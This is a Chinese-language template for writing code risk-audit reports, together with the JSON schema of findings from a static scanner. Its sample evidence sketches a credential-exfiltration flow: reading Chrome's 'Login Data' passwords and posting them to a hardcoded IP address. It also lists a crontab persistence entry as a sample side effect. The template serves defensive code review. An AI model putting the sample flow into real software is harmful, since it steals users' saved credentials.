# 报告与 findings JSON 模板

## 报告模板

用下面结构写报告。表格能说清的别写成长段;凡涉及行为,一律带 `文件:行号` 证据。

````markdown
# <目标名称> 代码风险检查

## 结论

- **安全等级**:L? <名称> —— <一句话依据>
- **类型标签**:`script + network + obfuscated`
- **检查范围**:<路径 / 文件数 / 行数 / 语言>
- **检查方式**:静态扫描 + 人工复核(+ 动态观察)

## 行为清单

| 维度 | 结论 | 证据 | 说明 |
| --- | --- | --- | --- |
| 读取 | 是 | `a.py:12` | 读取当前目录全部 `.csv` |
| 写入与删除 | 是 | `a.py:40` | 写 `result.json` 到当前目录 |
| 网络 | 是 | `a.py:55` | POST 到硬编码 `http://1.2.3.4/up` |
| 执行 | 否 | - | 无 |
| 持久化 | 否 | - | 无 |
| ... | | | |

## 副作用清单

| 产生什么 | 写到哪里 | 时机 | 退出后 | 证据 |
| --- | --- | --- | --- | --- |
| 结果文件 `out.json` | 当前工作目录 | 运行时 | 保留 | `a.py:40` |
| 缓存 `state.db` | `~/.cache/mytool/` | 首次运行 | 保留 | `a.py:52` |
| 临时文件 `/tmp/mytool-*.tmp` | 系统临时目录 | 运行时 | 自清理(异常退出可能残留) | `a.py:61` |
| crontab 条目 | 用户 crontab | 运行时 | 保留 | `a.py:70` |

一条都没命中时,写:**副作用:无(纯计算 —— 不落盘、不起进程、不出网、不改环境、不留残留)**。

## 运行时依赖

| 依赖 | 类型 | 是否必需 | 缺了会怎样 |
| --- | --- | --- | --- |
| Python 3.9+ | 语言运行时 | 必需 | 语法不兼容,无法启动 |
| requests | 第三方库 | 必需 | `ImportError` |
| ffmpeg | 系统命令 | 必需 | 转码步骤失败 |
| `API_KEY` | 环境变量 | 必需 | 启动即报错退出 |

## 关键证据

### 数据流:<读 cookie → 外发>

```text
a.py:12   读取 Chrome "Login Data" 数据库
a.py:30   sqlite3 查询 username/password_value
a.py:55   requests.post("http://1.2.3.4/up", json=rows)
```

<结论:构成凭据外传,L4>

## 动态观察(如已执行)

- 运行环境:VM、断网 / 指向本地观察点
- 出站请求:目标、方法、路径、携带字段
- 文件系统改动:新增 / 修改 / 删除
- 进程与连接:-

## 风险与建议

- <按严重度列,给可操作的处理建议>

## 未判定事项

- <哪些没查到、查不了、需要什么补>

## 方法与局限

- 工具、扫描范围、跳过项(二进制 / 大文件 / 依赖目录)
- 静态检查的固有局限:动态生成、运行时下载、环境分支的行为可能看不到
````

## findings JSON

`scripts/risk_scan.py` 输出这个结构,报告里附上文件路径即可,不必把 JSON 内容抄进报告。

```json
{
  "target": "/path/to/code",
  "generated_at": "2026-01-01T00:00:00Z",
  "scanned_files": 42,
  "skipped": {"binary": 3, "too_large": 1},
  "summary": {
    "by_category": {"网络": 7, "执行": 2},
    "by_severity": {"high": 3, "medium": 6, "low": 8, "info": 4},
    "level_hint_max": "L4"
  },
  "findings": [
    {
      "id": "net-http-py",
      "category": "网络",
      "severity": "medium",
      "level_hint": "L3",
      "lang": "py",
      "file": "a.py",
      "line": 55,
      "snippet": "requests.post(URL, json=rows)",
      "note": "HTTP 出站调用,需确认发送内容与目的地"
    }
  ]
}
```

字段说明:

- `severity`:命中强度,`high` / `medium` / `low` / `info`。`info` 多为弱信号(如出现 URL 字符串)。
- `level_hint`:**假如这条行为被确认为真**时的等级,只是上界提示,**不是结论**。报告定级必须人工复核。
- `category`:行为维度的粗分类,便于汇总。除 12 个维度外,还有"系统路径"(触及 `/etc`、`System32` 这类位置的命中,按实际读或写并入对应维度)和"资源滥用"(挖矿类)两个补充值。
- `dependencies`:运行时依赖汇总(`runtimes` / `declared` / `imported` / `system_commands` / `env_vars` / `platform_hints`),来源是清单文件与源码扫描,属线索级,报告前需核对版本与必要性。
- `side_effects`:从 findings 里筛出的副作用相关条目(写入 / 删除、副作用、系统路径、持久化四类),用来填报告的"副作用清单";
